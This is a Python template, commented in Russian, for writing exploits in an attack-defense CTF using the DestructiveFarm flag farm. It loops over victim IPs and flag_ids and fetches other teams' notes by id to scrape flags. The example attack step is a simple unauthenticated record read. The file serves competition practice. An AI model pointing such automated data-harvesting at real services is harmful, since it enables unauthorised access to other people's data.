#!/usr/bin/env python3
"""
Шаблон эксплойта под ферму (DestructiveFarm).
Контракт:
  - на вход: IP жертвы (argv[1]); опц. flag_id (argv[2]).
  - на выход: флаги в STDOUT, по одному на строку. Остальное — в STDERR.
Запуск вручную:  python3 sploit_template.py 10.60.10.2
"""
import sys, re, requests

PORT = 5000                      # <-- порт сервиса
TIMEOUT = 6
FLAG_RE = re.compile(r'[A-Z0-9]{31}=')     # <-- уточнить формат флага

def log(*a):
    print(*a, file=sys.stderr, flush=True)

def get_flag_ids(ip):
    """Взять свои flag_id для этой жертвы из attack_data.
    ВПИСАТЬ реальный URL attack_data. Если ферма сама передаёт flag_id — брать из argv."""
    if len(sys.argv) > 2:
        return [sys.argv[2]]
    try:
        url = "http://<ATTACK_DATA_HOST>/<path>"   # <-- на игре
        data = requests.get(url, timeout=TIMEOUT).json()
        svc = data.get("<service_name>", {})       # <-- имя сервиса
        return list(svc.get(ip, []))
    except Exception as e:
        log("attack_data error:", e)
        return []

def exploit(ip, flag_id):
    base = f"http://{ip}:{PORT}"
    s = requests.Session()
    # --- ЗДЕСЬ логика эксплойта ---
    # пример: вытащить записку жертвы по её id (flag_id)
    r = s.get(f"{base}/note/{flag_id}", timeout=TIMEOUT)
    for flag in FLAG_RE.findall(r.text):
        print(flag, flush=True)          # <-- флаг в stdout!

def main():
    if len(sys.argv) < 2:
        log("usage: sploit.py <victim_ip> [flag_id]"); sys.exit(1)
    ip = sys.argv[1]
    ids = get_flag_ids(ip) or [None]
    for fid in ids:
        try:
            exploit(ip, fid)
        except Exception as e:
            log(f"[{ip}] fid={fid} err={e}")

if __name__ == "__main__":
    main()
